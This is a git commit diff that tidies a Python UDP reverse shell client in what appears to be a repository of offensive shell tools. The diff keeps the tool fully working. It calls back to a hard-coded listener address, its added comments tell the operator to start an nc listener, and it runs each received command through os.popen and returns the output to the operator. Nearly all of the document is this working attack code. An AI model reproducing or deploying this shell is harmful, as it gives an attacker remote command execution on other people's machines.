7ecdfec7a420a58f27b31b160d1f6156b38f06d5
theMace <matti.aronen@gmail.com>
2016-09-28 13:06:15 +0300

    cleaning up, some comments...

--- shells/reverse/udp/python/rev_udp_shell_client.py
+++ shells/reverse/udp/python/rev_udp_shell_client.py
@@ -1,27 +1,24 @@
 #! /usr/bin/python
-
 import socket
 import os
 import sys
 import platform
-# don't forget to update the address and port!
+# prior launching the client, set up an nc listener... something like:
+# nc -lvunp 10000
+
+# change the following line to match your setup
 server_address = ('192.168.56.103', 10000)
 
 def launch():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    #s.bind(('', 80))
-    #launch = s.recv(1024)
-    #addr = launch[1][0]
-    #port = launch[1][1]
-    s.sendto('hello master', server_address)
+    s.sendto('hello master\n', server_address)
     return s
 
 s = launch()
 prompt = []
 
 def getsysinfo():
-    #que = s.recvfrom(1024)
-    #if que[1][0] == addr and que[1][1] == port:
+    # create a nice prompt...
     if os.getuid() == 0:
         prompt.append('root@')
         prompt.append('# ')
@@ -29,7 +26,6 @@ def getsysinfo():
         prompt.append('user@')  
         prompt.append('$ ')
     prompt.insert(1, platform.dist()[0])
-    #s.sendto(''.join(prompt), server_address)
     return
 
 
@@ -39,22 +35,24 @@ def shell():
         try:
             sent = s.sendto(''.join(prompt), server_address)
             command,count = s.recvfrom(1024)
-            print 'got command: ', command
+            command = command.strip()
+            # for debug...
+            # print 'got command: ', command
             if command.strip() == '':
                 continue
             if command.strip().split()[0] == 'cd':
                 os.chdir(command.strip('cd '))
-                s.sendto('Changed Directory', server_address)
+                s.sendto('Changed Directory\n', server_address)
             elif command.strip() == 'goodbye' or command.strip() == 'exit':
-                s.sendto('Goodbye master', server_address)
+                s.sendto('Goodbye master\n', server_address)
                 s.close()
                 break
             else:
                 proc = os.popen(command)
                 output = proc.read()
-                output = output.strip()
+                output = output.strip() + '\n'
                 s.sendto(output, server_address)
             command = ''
         except Exception, e:
-            s.sendto('An unexpected error has occured', server_address)
+            s.sendto('An unexpected error has occured\n', server_address)
 shell()
